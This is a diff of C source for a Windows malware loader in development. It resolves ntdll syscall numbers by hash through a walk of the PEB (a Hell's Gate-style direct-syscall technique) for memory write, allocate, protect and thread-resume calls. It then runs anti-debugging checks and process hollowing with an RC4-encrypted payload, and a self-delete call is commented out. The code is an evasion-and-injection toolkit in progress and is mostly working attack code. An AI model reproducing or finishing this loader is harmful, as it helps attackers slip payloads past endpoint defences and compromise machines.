+    else if (input == 3) { //Protect
+        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Protect.wSystemCall;
+        getchar();
+        return VxTable.Protect.wSystemCall;
+    }
+    else if (input == 4) { //ResumeThread
+        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.ResumeThread.wSystemCall;
+        getchar();
+        return VxTable.ResumeThread.wSystemCall;
+    }
+    else if (input == 5) { //QueryInfoProcess
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.QueryInfoProcess.wSystemCall;
+        getchar();
+        return VxTable.QueryInfoProcess.wSystemCall;
+    }
+    printf("Syscall input not found, check your input in C or RCX\n");
+
+}
+
 int main() {
 
+    initializeSystemCalls();
 
     STARTUPINFOA Si = { 0 };
     PROCESS_INFORMATION Pi = { 0 };
@@ -342,8 +811,104 @@ int main() {
     //for (int i = 0; i < sizeof(buf); i++) {
     //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
     //}
+ 
+    //DeleteSelf();
+
+
+
+    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
+                                                    //Read from GS register at 0x30 offset for TEB
+                                                    //Using TEB we can find PEB
+    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
+    PVOID pNtdllBase = NULL;
+    printf("Getting base...\n");
+
+
+    //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
+    //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
+
+    GetBase(pCurrentPEB, &pNtdllBase);
+    printf("NTDLL Base: 0x%p\n", pNtdllBase);
+    getchar();
+
+    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
+    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
+    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
+    GetImageExportDir(pNtdllBase,&ppImageExportDirectory,&dwDLLSize);
+
+
+
+    printf("DLL Size (bytes): %d", dwDLLSize);
+
+
+
+
+
+    VX_TABLE_ENTRY Write = { 0 };
+    VX_TABLE_ENTRY Read = { 0 };
+    VX_TABLE_ENTRY Allocate= { 0 };
+    VX_TABLE_ENTRY Protect = {0};
+    VX_TABLE_ENTRY ResumeThread = { 0 };
+    VX_TABLE_ENTRY QueryInfoProcess = { 0 };
+
+    //Hashes retrieved from Hasher code
+    VxTable.Write = Write;
+    VxTable.Write.dwHash = strtoull("C1189C40", NULL, 16);
+    
+    VxTable.Read = Read;
+    VxTable.Read.dwHash = strtoull("BE6B6431", NULL, 16);
+    
+    VxTable.Allocate = Allocate;
+    VxTable.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);
+    
+    VxTable.Protect = Protect;
+    VxTable.Protect.dwHash = strtoull("87C51496", NULL, 16);
+
+    VxTable.ResumeThread = ResumeThread;
+    VxTable.ResumeThread.dwHash = strtoull("2F7CB09E", NULL, 16);
+
+    VxTable.QueryInfoProcess = QueryInfoProcess;
+    VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);
+
+
+    printf("0x%0.8X\n", VxTable.Protect.dwHash);
+
+    printf("Struct populated...\n");
+
+    //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
+    printf("Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %d\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
+
+    // i wish there was a way to pass the entire struct and then loop through this
+
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Read);
+    VxTable.Read.wRCXVal = 0;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Write);
+    VxTable.Write.wRCXVal = 1;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Allocate);
+    VxTable.Allocate.wRCXVal = 2;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
+    VxTable.Protect.wRCXVal = 3;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.ResumeThread);
+    VxTable.ResumeThread.wRCXVal = 4;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
+    VxTable.QueryInfoProcess.wRCXVal = 5;
+
     detectDebug();
+
+    //GetSystemcallAddresses(dwDLLSize, &pSystemCalls, pNtdllBase, pTextSection);
+
+    printf("Second run: Systemcall: Write\t ADDR: 0x%p \t Hash: %0.8X \t SSN: %hu\n", VxTable.Write.pAddress, VxTable.Write.dwHash, VxTable.Write.wSystemCall);
+    //Now we just have to call the function using assembly temmplates!
+    getchar();
+
+    //i just realised im dumb we need all the params to the syscall as well haha so its better
+    //to keep the register params empty for the syscall and then call vals within the assemnbly and use return regiser instead
+
+    //NoahSyscallTemplate(VxTable.Allocate.wSystemCall, 
+    getchar();
     hollowProcess(Pi, sizeof(Rc4CipherText));
-    selfDelete();
+
+
+    getchar();
     return 0;
 }
